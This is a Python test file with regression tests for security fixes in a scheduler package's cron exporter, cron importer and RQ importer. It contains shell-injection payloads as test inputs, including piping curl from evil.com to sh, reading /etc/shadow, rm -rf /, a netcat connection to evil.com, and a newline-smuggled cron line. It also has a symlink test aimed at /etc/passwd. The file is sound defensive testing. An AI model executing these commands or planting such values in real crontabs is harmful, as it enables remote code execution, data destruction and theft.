"""Regression tests for the Apr 2026 security audit fixes that
live in the z4j-scheduler package (cron exporter / cron importer /
rq importer / shadow comparator).

Brain-side fixes are pinned in
``packages/z4j/backend/tests/unit/test_security_audit_apr_2026.py``.
"""

from __future__ import annotations

from pathlib import Path

import pytest

# =====================================================================
# 1.1 + 1.2: Cron exporter rejects shell-injection in expression /
#            sanitises name newlines
# =====================================================================


class TestCronExporterShellInjection:
    """The cron exporter renders SHELL lines that the operator
    installs into a real crontab. Injection in the cron expression
    field is the highest-impact RCE vector.
    """

    def _exported(
        self,
        *,
        expression: str,
        name: str = "x",
        task: str = "app.t",
    ):
        from z4j_scheduler.exporters._client import (
            ExportedSchedule,
        )

        return ExportedSchedule(
            id="00000000-0000-0000-0000-000000000001",
            name=name,
            engine="celery",
            kind="cron",
            expression=expression,
            task_name=task,
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            catch_up="skip",
            is_enabled=True,
            scheduler="z4j-scheduler",
            source="dashboard",
        )

    def test_safe_cron_expression_renders(self) -> None:
        from z4j_scheduler.exporters import cron

        out = cron.render([self._exported(expression="0 * * * *")])
        # Expression appears in a real cron line.
        assert "0 * * * * $WRAPPER" in out

    def test_semicolon_in_expression_refused(self) -> None:
        from z4j_scheduler.exporters import cron

        # The exploit case: a malicious schedule's expression
        # contains shell metacharacters. The exporter MUST refuse
        # to render an active line. The expression text may still
        # appear inside a comment ("# REFUSED ... <expression> ...")
        # which is inert under cron, but no NON-comment line may
        # carry the metacharacters.
        out = cron.render(
            [
                self._exported(expression="* * * * * ; curl evil.com|sh #"),
            ]
        )
        # Refused-line marker present.
        assert "REFUSED" in out
        # Walk every line: if it carries shell metachars it MUST
        # be a comment line (cron treats `#` as line comment).
        for line in out.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or stripped.startswith("WRAPPER="):
                continue
            assert "; curl" not in stripped, (
                f"active (non-comment) cron line carries shell metacharacters: {stripped!r}"
            )
            assert "|" not in stripped or "$WRAPPER" not in stripped

    def test_backtick_in_expression_refused(self) -> None:
        from z4j_scheduler.exporters import cron

        out = cron.render(
            [
                self._exported(expression="* * * * * `cat /etc/shadow`"),
            ]
        )
        assert "REFUSED" in out

    def test_dollar_paren_in_expression_refused(self) -> None:
        from z4j_scheduler.exporters import cron

        out = cron.render(
            [
                self._exported(expression="* * * * * $(rm -rf /)"),
            ]
        )
        assert "REFUSED" in out

    def test_pipe_in_expression_refused(self) -> None:
        from z4j_scheduler.exporters import cron

        out = cron.render(
            [
                self._exported(expression="* * * * * | nc evil.com 9999"),
            ]
        )
        assert "REFUSED" in out

    def test_dow_letter_alias_refused_too(self) -> None:
        # Conservative: alphabetic aliases (MON-FRI) are valid
        # cron-side but the exporter rejects them because they
        # widen the audit surface for diminishing return. This
        # test pins that conservative choice.
        from z4j_scheduler.exporters import cron

        out = cron.render(
            [
                self._exported(expression="0 9 * * MON-FRI"),
            ]
        )
        assert "REFUSED" in out

    def test_newline_in_name_sanitised(self) -> None:
        # Pre-fix: a name with embedded \n could break out of the
        # ``# {name}`` comment and inject an active cron line below.
        from z4j_scheduler.exporters import cron

        injected_name = "innocuous\n0 * * * * curl evil.com"
        out = cron.render(
            [
                self._exported(expression="0 * * * *", name=injected_name),
            ]
        )
        # The newline is collapsed - no second cron line lurks
        # under what looks like the comment.
        for line in out.splitlines():
            stripped = line.strip()
            if stripped.startswith("#"):
                continue
            if not stripped:
                continue
            if stripped.startswith("WRAPPER="):
                continue
            # Every active line must reference $WRAPPER
            # (the legitimate render shape).
            assert "$WRAPPER" in stripped, f"unexpected active line in output: {stripped!r}"


# =====================================================================
# 5.1 + 5.2: Cron importer O_NOFOLLOW + size cap
# =====================================================================


class TestCronImporterPathSafety:
    def test_oversized_file_rejected(self, tmp_path: Path) -> None:
        from z4j_scheduler.importers.cron import (
            read_crontab,
        )

        # Write a 2 MB file - over the 1 MB cap.
        crontab = tmp_path / "huge.cron"
        crontab.write_bytes(b"# fake comment line\n" * 200_000)
        with pytest.raises(ValueError, match="bytes"):
            read_crontab(
                crontab_path=crontab,
                project_slug="p",
                task_prefix="app.shell.exec",
            )

    def test_normal_file_imports(self, tmp_path: Path) -> None:
        from z4j_scheduler.importers.cron import (
            read_crontab,
        )

        crontab = tmp_path / "small.cron"
        crontab.write_text(
            "# header\n0 * * * * /usr/local/bin/heartbeat\n*/5 * * * * /usr/local/bin/poll\n",
        )
        rows = read_crontab(
            crontab_path=crontab,
            project_slug="p",
            task_prefix="app.shell.exec",
        )
        assert len(rows) == 2

    def test_symlink_to_sensitive_file_refused_on_posix(
        self,
        tmp_path: Path,
    ) -> None:
        # POSIX-only: O_NOFOLLOW behaviour. On Windows symlinks
        # require elevation to create, so the threat model is
        # weaker; we skip the assertion there.
        import sys

        if sys.platform == "win32":
            pytest.skip("O_NOFOLLOW is a no-op on Windows")

        from z4j_scheduler.importers.cron import (
            read_crontab,
        )

        # Create a symlink pointing at /etc/passwd (or any readable
        # file). The importer MUST refuse to read through it.
        link = tmp_path / "evil.cron"
        try:
            link.symlink_to("/etc/passwd")
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported in this test env")
        with pytest.raises(ValueError):
            read_crontab(
                crontab_path=link,
                project_slug="p",
                task_prefix="app.shell.exec",
            )


# =====================================================================
# 6.1: RQ importer redacts password from URL
# =====================================================================


class TestRqImporterUrlRedaction:
    def test_password_in_url_redacted(self) -> None:
        from z4j_scheduler.importers.rq import (
            _redact_redis_url,
        )

        red = _redact_redis_url("redis://:supersecret@host:6379/0")
        assert "supersecret" not in red
        assert "***" in red
        assert "host:6379" in red

    def test_username_password_in_url_redacted(self) -> None:
        from z4j_scheduler.importers.rq import (
            _redact_redis_url,
        )

        red = _redact_redis_url("redis://alice:s3cret@redis.example:6380/2")
        assert "s3cret" not in red
        assert "***" in red
        assert "alice" in red

    def test_no_password_passes_through(self) -> None:
        from z4j_scheduler.importers.rq import (
            _redact_redis_url,
        )

        plain = "redis://host:6379/0"
        assert _redact_redis_url(plain) == plain

    def test_unparseable_url_does_not_raise(self) -> None:
        from z4j_scheduler.importers.rq import (
            _redact_redis_url,
        )

        # Defensive: never raise from a redactor (it's used inside
        # error-handling paths; raising would mask the original
        # failure).
        result = _redact_redis_url("not-a-url-at-all")
        assert isinstance(result, str)
